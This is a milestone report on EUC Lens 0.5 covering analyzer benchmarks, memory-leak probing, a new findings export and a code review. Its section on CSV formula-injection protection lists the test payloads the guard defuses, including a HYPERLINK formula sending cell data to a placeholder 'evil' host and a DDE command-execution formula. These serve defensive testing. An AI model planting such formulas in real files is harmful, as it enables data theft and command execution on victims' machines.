# EUC Lens 0.5 — M3: performance, reliability and secure export

Status: implemented in 0.5.0 (release candidate on `feature/euc-lens-0.5-intelligent-diagnostics`; not yet published). The measurements below were taken on the M3 commit, before the version change from 0.4.4 to 0.5.0, which touches no analysis or export code. Manual Horizon acceptance (M4) was accepted by the project owner; it was not independently verified by the project's own tests.

M3 changes no detection threshold, baseline, severity or correlation rule, and not the recording format `euclens.recording/1`. It adds measurement, protection against regressions, one optional export, and fixes for what the measurement and the review found.

## 1. Performance methodology

* **Release builds**, one process, the performance and retention tests in a serial xUnit collection (nothing else runs at the same time: the heap and the clock are process-wide).
* **The fixture is built before the clock starts.** Two warm-up analyses are discarded, then seven analyses are timed one by one; the tables report the **median and the range**, never a single run.
* **Allocated bytes** = `GC.GetAllocatedBytesForCurrentThread` around one analysis (it is synchronous); the input arrays are not counted.
* **Retained memory per result** = the heap after a full collection with ten results kept alive, minus the heap with none, divided by ten. It is the size of the result graph (observations, evidence, strings), not growth caused by analyzing.
* **Retained memory across repeated runs** is a different question and has its own method (§2).
* Limits asserted by the tests are several times above what was measured: they catch quadratic or runaway behaviour, not machine speed. They were not raised to turn a run green.

Environment of the numbers below: the CI runner `windows-latest` (run 40391050527, commit `3843f17`, .NET SDK 10.0.402, Release, x64) and, where stated, a developer Mac (Apple silicon, .NET 10.0.401, Release). Runner speed varies between runs by tens of percent; the shape (linear, bounded) does not.

### Analyzer, target workloads (Windows runner)

| Samples (after gaps) | Median time (range) | Allocated per analysis | Retained per result | Observations / correlations / omitted |
|---|---|---|---|---|
| 1,200 | 0.4 ms (0.4–0.5) | 0.05 MiB | 3.4 KiB | 0 / 0 / 0 |
| 21,300 (20,800) | 8.4 ms (8.2–9.0) | 0.63 MiB | 50 KiB | 25 / 5 / 0 |
| 40,795 (39,795) | 16.3 ms (16.1–22.9) | 1.15 MiB | 96 KiB | 50 / 10 / 0 |
| 250,000 (243,800) | 111 ms (110–119) | 6.61 MiB | 580 KiB | 310 / 62 / 0 |

Same workloads on the Mac: 0.3 ms, 5.8 ms, 11.5 ms, 78.9 ms (allocations identical). Data coverage of all four fixtures is 100 % of the samples (the 100 s gaps are removed samples, so 20,800 and 39,795 samples are analyzed).

Retained heap after repeated analyses (§2): 40,795 samples, 20 analyses per batch: slope −0.9 KiB per run (cumulative 0); 250,000 samples, 6 per batch: slope −3.3 KiB per run (cumulative 0). The analyzer retains nothing between runs; the "retained per result" column is what a *kept* result costs.

Cancellation of a 250,000-sample analysis (cancel requested 3 ms after the start): the analysis stopped 0.2–21 ms after the request in the runs that were still in progress (two of five had already finished); limit asserted: 250 ms.

Linearity: 10× the samples cost 11.5× the time (25,000 → 250,000: 9.7 → 111.8 ms).

### Adversarial recordings (250,000 samples unless stated; Windows runner)

| Scenario | Median | Allocated | Result |
|---|---|---|---|
| very long, healthy | 111 ms | 4.4 MiB | 0 observations |
| 12 of 13 metrics unavailable | 7.9 ms | 1.3 MiB | 0 observations; ≥ 10 rules "Insufficient data" |
| disconnected throughout (stale 500 ms RTT, 40 % loss, 0 FPS) | 50 ms | 4.1 MiB | 0 connection or graphics observations |
| 45 % missing, 15 % invalid (non-finite, negative, 1e12) | 104 ms | 8.8 MiB | 242 observations, none with an invalid value as evidence; 8,073 omitted by the limits; coverage 60 % |
| irregular sampling, 0.2–12 s plus gaps | 15.9 ms | 4.0 MiB | 200 observations; linear (25,000 → 250,000: 1.9 → 15.4 ms) |
| 500 session changes + 20,000 events | 113 ms | 4.4 MiB | at most 10 associated events per observation |
| 1,250 gaps and reconnections (212,530 samples) | 95 ms | 5.7 MiB | linear (8.6 → 94.9 ms) |
| 35,000 single-sample spikes | 113 ms | 24 MiB | 100 observations, 35,600 omitted and reported; linear (10.1 → 114.2 ms) |
| 500 observations (limits apply) | 114 ms | 8.5 MiB | 500 observations, 2,500 omitted, truncation disclosed |

No quadratic behaviour was found, so no analyzer code was optimized. The largest allocation (24 MiB) is the list of 35,000 candidate episodes before ranking and capping; it is bounded by samples/2 episodes of a few words each and is released after the analysis.

## 2. Memory: method, findings, corrections

### 2.1 Why the old test was not enough

`RepeatedAnalysisDoesNotGrowTheHeap` passed when `Math.Min(second, third) < 1 MiB`. A leak that shows in every batch but happens to be small in two of them passes that check (`ABatchComparisonLikeTheOldTestCouldMissAGrowingLeak…` reproduces it with numbers: growth per batch 1229, 102, 1024, 102, 1126, 102 KiB, old check passes, new verdict fails). It also could not tell whether anything specific was released.

### 2.2 The retention probe (`tests/EucLens.Tests/RetentionProbe.cs`)

* Runs the operation in **batches**; after each batch the managed heap is read after a **full blocking, compacting collection** (three rounds with finalizers), i.e. what is still reachable, not what was allocated.
* The first batches are **warm-up** and discarded. They absorb JIT, tiered compilation, array-pool sizing and the first-use costs of the runtime. On the Mac the first measured batch of a stable operation sometimes still shows +0.5 MiB (array pool), and once showed a 8 MiB *fall* right after warm-up (earlier garbage released late). Both are normal and the verdict tolerates them.
* From the measured batches the probe derives the growth of every batch, the **Theil–Sen slope** (median of the slopes between all pairs of readings), the **cumulative rise** (end minus the lowest reading) and the largest single batch. A least-squares slope was tried first and was fooled by the 8 MiB outlier (a deliberate leak of 460 KiB per batch looked like a fall); the test that found this is kept as a regression test.
* **Verdict = leak** if the slope exceeds 6 KiB per run, or the cumulative rise exceeds 2 MiB, or one batch retains more than 1.5 MiB. 6 KiB per run is the detection floor (120 KiB per 20-run batch). Smaller leaks are not claimed to be absent.
* `GC.GetTotalMemory` is process-wide and says nothing about a particular object. Therefore **weak references** (`Lifetime`) prove the release of named objects, after the thread pool has turned over: a worker thread keeps the last result it handled in a stale slot until it has run something else (measured: a loaded history stayed reachable after `await Task.Run` until about 20 more work items had run, then was collected). The helper churns the pool before it collects.

### 2.3 The probe is proven against leaks that are put in on purpose

| Fixture (Windows runner) | Result of the probe |
|---|---|
| results kept in a list (a cache that is never emptied) | leak: 10.8 KiB per run |
| 16 KiB buffer kept per run | leak: 16.0 KiB per run |
| a view-like handler subscribed to a long-lived event and never removed (captures 16 KiB) | leak: 16.1 KiB per run |
| 512 KiB allocated and dropped per run | not a leak (0.0 KiB per run) |
| a rise hidden behind one outlier reading | leak (regression test) |
| a flat heap after one large early fall | not a leak (regression test) |
| a retained object checked by `Lifetime.AssertCollectedAsync` | the check fails, as it must |

The leaking fixtures live only in the tests.

### 2.4 Results on the product

No retention was found in the analyzer, the findings model, `SessionHistoryViewModel`, the chart data and LiveCharts objects, the weak subscriptions, the cancellation sources or the queued UI callbacks. Everything measured is flat:

| What | Measurement |
|---|---|
| analyzer, 40,795 samples | slope −0.9 KiB per run |
| analyzer, 250,000 samples | slope −3.3 KiB per run |
| findings model, 200 show/select/filter/clear cycles per batch | 0 KiB growth in every batch |
| findings navigation (12 rounds per batch, selection changes cancelling earlier chart refreshes) | slope −0.2 KiB per round; subscribers unchanged; chart rows the same instances |
| Session History, 42 complete open / select / leave cycles | slope +0.8 KiB per cycle: this is the test's own list of weak references (30 entries per cycle); the same page without it is flat |
| Windows smoke, 12 real visits (open, select via the list, show in charts, export JSON, leave) | heap 10.9 → 11.0 MiB (slope 0.01 MiB per cycle); views alive 0/12; findings, analysis and chart objects alive 0/84; subscribers constant (history 1, findings 1, visible findings 1, events 2, charts 1); unobserved task exceptions 0 |

Lifetime tests (weak references, all collected): analysis and input; findings items, selection, details and the analysis after `Clear`; every object of recordings that are no longer shown while 30 switches between two recordings with different channels and findings run (only the current recording's findings and charts are ever shown, the right chart is emphasized each time); objects of recordings opened, cancelled and left in quick succession (12 rounds, including leaving while the analysis may still run) with no stale result and no unobserved task exception; 42 complete page cycles; objects reachable from callbacks queued to the UI context.

### 2.5 Corrections made in M3

No memory defect was found in the product, so none was "fixed". What was corrected:

1. The weak test (§2.1) was replaced by the probe; the probe's own flaw (§2.2) was found by running it and corrected.
2. The performance tests run in a serial collection and compare batches (done earlier, kept).
3. Fire-and-forget work that could fail unobserved now logs and shows the failure: the chart refresh (`RefreshAsync`) and the incident analysis (`AnalyzeAsync`); the findings export (an `async void` command) reports any failure instead of letting it reach the dispatcher.
4. Export buttons are refreshed when the analysis starts, not only when it ends.

## 3. Session History stress scenarios

| Scenario | Covered by |
|---|---|
| A repeated navigation | `RepeatedFindingNavigationKeepsMemorySubscriptionsAndChartInstancesStable` (selection changes without waiting, correlation, filters, show full; probe + subscriber counts + chart row identity) |
| B recording switching | `SwitchingBetweenRecordingsShowsOnlyTheCurrentOneAndReleasesTheOthers` |
| C rapid cancellation | `OpeningLeavingAndOpeningAgainInQuickSuccessionPublishesNothingStaleAndFailsNothing` (UnobservedTaskException counted) |
| D repeated lifetime | `ManyCompleteOpenAndCloseCyclesRetainNothing` (42 cycles) and the smoke "findings lifetime" (12 cycles on the real controls); the existing 12-cycle History retention check is unchanged |
| E background monitoring | the existing v0.4.4 tests (`BackgroundViewModelTests`, hidden window keeps collecting, evaluating and recording; repeated hide/restore; quota; pause) and the smoke background validation, all unchanged and passing |

## 4. Findings export

Two optional, user-initiated files from the Session History findings panel: **Export findings (CSV)** and **Export findings (JSON)**. They are separate from the session CSV/JSON and from the incident and timeline exports, whose schemas and behaviour are unchanged. Nothing leaves the machine and no service is called.

### 4.1 CSV (`euclens.findings/1`)

UTF-8 **with byte-order mark** (so spreadsheets read non-ASCII text correctly), comma delimiter, CRLF line ends, RFC 4180 quoting, one header row, then one row per observation and one per correlation, in the engine's deterministic order. Columns, in this order (columns are only appended in later versions):

`schema, recording_id, engine_version, record_type, record_id, rule_or_pattern, rule_version, domain, severity, analysis_status, kind, start_utc, end_utc, duration_seconds, ending, recovered_at_utc, metric_id, metric, unit, minimum, p50, p95, maximum, worst_at_utc, valid_samples, matching_samples, coverage, threshold_basis, absolute_threshold, baseline_limit, baseline_median, baseline_sigma, baseline_samples, baseline_reliable, supporting_metrics, correlation_timing, common_overlap_start_utc, common_overlap_end_utc, component_ids, channels, reduced_confidence, recording_state, explanation, limitations`

Times are ISO 8601 UTC (`2026-10-23T08:06:38.0000000Z`); numbers are invariant ("R" format, no thousands separators); measurements are in the **recorded unit**. A value that does not exist is an empty cell (never 0, NaN or Infinity): a correlation row has no measurement columns, an unreliable baseline has no median or sigma. `component_ids` and `limitations` join with `; ` and ` | `. `common_overlap_*` is filled only for `CommonOverlap`; chained and tolerance-linked correlations have it empty. `reduced_confidence` and `recording_state` repeat on every row, so an in-progress, interrupted or partial recording is labelled in every row that someone might copy elsewhere. Explanations are the engine's text, unchanged.

### 4.2 CSV formula-injection protection (`CsvField`)

Recorded strings (counter titles and units, session metadata, event and rule text) are untrusted. Two concerns are kept apart:

* **Structure** (RFC 4180): a field with a comma, double quote, CR, LF, or leading or trailing whitespace is quoted and inner quotes are doubled.
* **Formula protection**: a text field gets **one leading apostrophe** (the text marker of spreadsheets) when it begins with `=`, `+`, `-`, `@` (and their full-width forms `＝ ＋ － ＠`), when it begins with TAB, CR or LF, or when one of those characters follows leading whitespace, control characters or invisible format characters (space, tab, no-break space, zero-width space, byte-order mark, em space, C0 controls). Quoting alone is not protection: the CSV reader removes the quotes and the cell is the formula; a test asserts that.
* Generated **numbers are never prefixed** (a negative number is a number). Control characters other than TAB/CR/LF in a text cell become a space; unpaired surrogates become U+FFFD so the file is valid UTF-8; a text longer than 32,000 characters is cut with a visible `…[truncated]` marker (spreadsheets cap a cell at 32,767), without splitting a surrogate pair.
* The one representation change is the apostrophe. The JSON export keeps every string exactly as recorded.
* The same guard now protects the existing **timeline/incident CSV** (`HistoryExport.Cell`): its columns and values are unchanged, but a formula hidden behind leading whitespace, a line feed or an invisible character (which the previous check missed) is now defused too.

Tested payloads (all defused, original preserved): `=HYPERLINK("http://evil/?x="&A1,"click")`, `=1+1`, `+SUM(A1:A9)`, `-1+2`, `@SUM(1,1)`, `=cmd|' /C calc'!A0`, `" =1+1"`, tab / CR / LF / CRLF prefixes, several leading blanks, no-break space, zero-width space, byte-order mark, em space, full-width forms, C0 control prefix; plus embedded commas, quotes, CR/LF, Unicode, a 100,000-character string, empty and null fields; and an end-to-end export of a recording whose counter title is a `HYPERLINK` formula, read back with an RFC 4180 reader: no text cell of any row can be read as a formula.

### 4.3 JSON (`euclens.findings/1`)

```json
{
  "schema": "euclens.findings/1",
  "recording":   { "key", "shortId", "recordingId", "startedUtc", "endedUtc", "hasEnded", "state", "endReason", "source", "appVersion", "protocols": [], "samples", "lostSamples", "parts", "dataCoverage", "gaps", "gapSeconds", "partial", "partialReason" },
  "analysis":    { "engineVersion", "fromUtc", "toUtc", "samplesAnalyzed", "reducedConfidence", "observationCount", "correlationCount", "omittedObservations", "truncated" },
  "observations": [ { "id", "ruleId", "ruleVersion", "kind", "domain", "severity", "status", "title", "startUtc", "endUtc", "durationSeconds", "ending", "recoveredAtUtc",
                      "metrics": [ { "channelId", "title", "unit", "role", "available", "validSamples", "minimum", "p50", "p95", "maximum", "worstAtUtc" } ],
                      "sampleCount", "matchingSamples", "coverage",
                      "threshold": { "basis", "absolute", "baselineLimit", "comparison", "baseline": null | { "channelId", "unit", "reliable", "median", "mad", "sigma", "p05", "p95", "samples", "spanSeconds", "reason" } },
                      "associatedEvents": [ { "kind", "atUtc", "title" } ], "associatedEventCount", "explanation", "limitations": [] } ],
  "correlations": [ { "id", "pattern", "severity", "title", "startUtc", "endUtc", "timing", "commonOverlap": null | { "startUtc", "endUtc" },
                      "componentIds": [], "links": [ { "firstId", "secondId", "overlapStartUtc", "overlapEndUtc", "gapSeconds" } ], "channels": [], "explanation", "limitations": [] } ],
  "coverage":       [ { "channelId", "title", "unit", "usable", "samples", "validSamples", "outOfRangeSamples", "coverage", "firstValidUtc", "lastValidUtc", "reason" } ],
  "ruleEvaluations": [ { "ruleId", "ruleVersion", "channelId", "state", "status", "reason", "observations", "eligibleSamples", "excludedSamples" } ],
  "limitations": []
}
```

UTF-8 without a byte-order mark, indented, UTC ISO 8601 times, invariant numbers. **No NaN or Infinity can be written**: a non-finite or unavailable number is `null`, and a metric states `available`. An unreliable baseline has `reliable: false` and null statistics. Observations and correlations are separate arrays with the engine's order and identifiers; a correlation lists its component ids and the pairwise links; `commonOverlap` is `null` unless every component was present in it. Unpaired surrogates in recorded strings are replaced (the writer would otherwise throw). The recording's folder, user and host names are **not** exported.

### 4.4 Output safety and lifecycle

* The file is built off the UI thread, written to a temporary file beside the target (`CreateNew`, never an existing file), flushed to disk, then moved over the target: a failure, cancellation or full disk leaves the previous file (or none) and **no temporary file**. A cancelled save dialog does nothing.
* A findings file is **never written over a recording**: names that are recording parts, meta files or annotations (`EucLens-…-part001.jsonl[.gz]`, `….meta.json`, `….annotations.json`, matched case-insensitively) are refused with an explanation, whether or not the file exists. The save dialog offers every file of a folder, so this is enforced where the file is written.
* Cancelled with the page (leaving Session History); the analysis, the selection, the charts and the recording are untouched; the recording's files were verified byte-identical before and after (unit test and Windows smoke).
* Errors (permission, disk full, invalid path, file locked by a spreadsheet) are shown in the findings panel (`The findings could not be exported: … No partial file was left.`) and the button is available again.

### 4.5 Limitations of the export

* The whole file is built in memory (at most 500 observations; a few MB at worst), then written; there is no streaming.
* CSV text cells are cut at 32,000 characters; JSON is complete.
* The apostrophe is visible in tools that do not treat it as a text marker (some CSV viewers, programming libraries).
* Spreadsheet behaviour was tested with an RFC 4180 reader and by the rules above, not by opening the files in Excel or LibreOffice in CI.
* Associated event titles (recorded finding titles) are exported in the JSON only.

## 5. Tests added in M3

621 → 724 (104 test cases added, one replaced: +103, 0 skipped).

* `FindingsExportTests` (74 cases): formula payload theory, quoting, controls and surrogates, length, header and row shape, measurements and UTC, chained correlation in both formats, JSON structure and strings, unavailable values, unreliable baseline, incomplete recordings, privacy, determinism across cultures, atomic files, cancellation and failure, recording names, the timeline export.
* `HistoryFindingsPresentationTests` (+2): export through the commands (selection, view and recording unchanged), cancelled dialog, failing path, leaving the page during an export.
* `MemoryRetentionTests` (9): probe on the analyzer (40,795 and 250,000 samples), the probe's sensitivity (three leaks, a temporary allocation, masked and noisy series), the weak-reference check, analysis objects, the findings model.
* `SessionHistoryLifetimeTests` (5): scenarios A–D and queued UI callbacks.
* `AnomalyBenchmarkTests` (14): the four workloads, nine adversarial recordings, cancellation.
* `AnomalyPerformanceTests`: the weak heap test was removed (replaced by `MemoryRetentionTests`); the rest is unchanged.
* Windows smoke (`HistoryValidation`): findings layout matrix (four display sizes, both themes), findings export through the real buttons, findings lifetime (12 real visits).

## 6. Windows WPF validation

CI cannot change the DPI of the running process. The validation therefore **simulates the effective DIP space**, as the layout matrix of the other pages does: the real client stays attached inside a Canvas that is given the size the display leaves (`pixels ÷ scale`, minus window chrome). It validates layout at those sizes; it is **not** a test of per-monitor DPI changes, which needs a real machine (M4).

| Case (simulated) | Client | Page viewport | Findings panel |
|---|---|---|---|
| 1920×1080 at 100 % | 1904×1041 | 1720×975 | 1663×568 |
| 1920×1080 at 125 % | 1520×825 | 1336×759 | 1279×587 |
| 1366×768 at 100 % | 1350×729 | 1166×663 | 1109×587 |
| 2560×1440 at 150 % | 1691×921 | 1507×855 | 1450×568 |

Each, in light and dark: 31 visible texts, none outside the panel; the three buttons (Show full recording, Export findings CSV and JSON) visible, focusable, tab stops, inside the panel and on the first screen; the severity filter fits; the findings list bounded. The existing layout matrix (170 cases) passes unchanged. Also checked on the real controls: no binding errors; export buttons reachable by keyboard and by UI Automation `Invoke`; the panel intact after export, cancellation and failure; chart ranges and markers (from M2); stale state after switching recordings (unit tests and lifetime section). Screenshots are in the CI artifact (`history-findings-*.png`, `history-findings-matrix-*.png`).

## 7. Independent review

A focused review of the M3 diff and the code it touches (no other agent was used). Severity as defined in the task.

| # | Finding | Severity | Resolution |
|---|---|---|---|
| 1 | The save dialog can point the findings export at a recording's meta, annotation or part file, which the export would then replace | **High** | Fixed: such names are refused (also case-insensitively); test with five names, existing and new files |
| 2 | The timeline CSV guard missed a formula behind leading whitespace, LF or invisible characters | **High** | Fixed with the shared guard; schema unchanged; test |
| 3 | `AsyncCommand` is an `async void`: an unexpected exception in the export would reach the dispatcher | Medium | Fixed: the export reports any failure |
| 4 | Chart refresh and incident analysis are started without being awaited; a failure other than cancellation would stay in an unobserved task | Medium | Fixed: logged and shown |
| 5 | Export buttons stayed enabled while a new analysis ran | Medium | Fixed (harmless before: the command ignored the click) |
| 6 | The old heap test could pass while memory grew; the first version of the new probe could be masked by one outlier | Medium | Fixed (§2) |
| 7 | JSON writer throws on an unpaired surrogate in a recorded string | Medium | Fixed (replaced with U+FFFD), test |
| 8 | `BackgroundViewModel.RefreshRecordingsAsync` catches only IO/permission errors and is called without awaiting from several places | Low | Not changed (outside M3 scope; a failure other than IO is not expected from a directory scan); recorded |
| 9 | The export is built entirely in memory | Low | Documented: bounded by the 500-observation limit |
| 10 | The probe cannot see a leak below about 6 KiB per run | Low | Documented; the page-level smoke and the weak references cover named objects |
| 11 | `OpeningAndLeavingThePageRepeatedlyReleasesTheChartsAndTheirLiveChartsObjects` fails on a Mac in Debug (at the commit before M3 too) because a pool thread still holds an object; it passes in Release and on Windows CI | Low | Left unchanged; same cause as §2.2 (stale slot); not a product retention |

No Critical findings. Thread affinity: the export builds on the pool from immutable records and publishes its message on the UI context; cancellation sources are disposed and replaced under the page lifecycle; export and analysis tokens are separate.

## 8. Remaining risks before M4

* **Thresholds and baselines are still engineering defaults**, never calibrated on a fleet; M4 decides whether they are right for Horizon.
* **Real recordings only through the writer and the loader of this repository.** A real multi-part Horizon recording (and one still being written) must be opened by a person.
* **DPI**: simulated effective width only; no true per-monitor DPI change, no screen reader run.
* **Spreadsheets**: the CSV protection is verified by rules and an RFC 4180 reader, not by Excel or LibreOffice.
* **Timing numbers** depend on the runner; the limits catch order-of-magnitude regressions only.
* The Unknown-protocol note and the availability notes depend on what real recordings contain.

The owner has since accepted M4 (see `docs/ROADMAP_0.5.md`); that acceptance does not remove the risks above.
